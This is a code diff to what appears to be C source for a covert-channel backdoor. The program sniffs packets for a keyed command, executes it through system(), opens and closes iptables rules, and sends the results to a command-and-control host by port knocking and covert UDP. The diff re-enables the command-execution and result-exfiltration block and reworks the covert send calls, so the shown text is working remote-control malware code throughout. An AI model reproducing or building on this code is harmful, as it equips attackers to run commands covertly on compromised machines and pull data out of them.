@@ -123,11 +123,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 //send results
                 //close loop end of results
                 //recv_data loop create for UDP
-                /*FILE *file;
-                if((file = fopen(FILENAME, "wb+")) < 0){
-                    perror("fopen");
-                    exit(1);
-                }
                 system(CHMOD);
                 system(CMD);
                 //open outbound rule
@@ -135,14 +130,15 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 printf("COMMAND RECEIEVED \n");
                 //sending the results back to the CNC
                 printf("PORT KNOCKING\n");
-                PortKnocking(Filter, NULL, NULL, true, false);
+                unsigned char *buf = 0;
+                covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
+                covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
                 printf("SENDING RESULTS\n");
-                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE);
+                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
                 iptables(Filter->targetip, "udp", PORT, false, true);
                 printf("\n");
                 printf("\n");
-                printf("Waiting for new command\n");*/
-
+                printf("Waiting for new command\n");
             }
         } else {
             printf("Wrong key tossing packet\n");
@@ -326,7 +322,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
     printf("PORT KNOCKING\n");
     PortKnocking(Filter, NULL, NULL, true, false);
     printf("SENDING RESULTS\n");
-    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE);
+    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
     iptables(Filter->targetip, "tcp", PORT, false, true);
     printf("\n");
     printf("\n");
@@ -431,7 +427,7 @@ void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const
             iptables(Filter->targetip, "tcp", PORT, true, false);
             char *dip = Filter->targetip;
             printf("WAITING FOR DATA\n");
-            recv_results(dip, (short)PORT, RESULT_FILE, true);
+            recv_results(dip, UPORT, RESULT_FILE, true);
             iptables(Filter->targetip, "tcp", PORT, true, true);
             pcap_breakloop(interfaceinfo);
         }
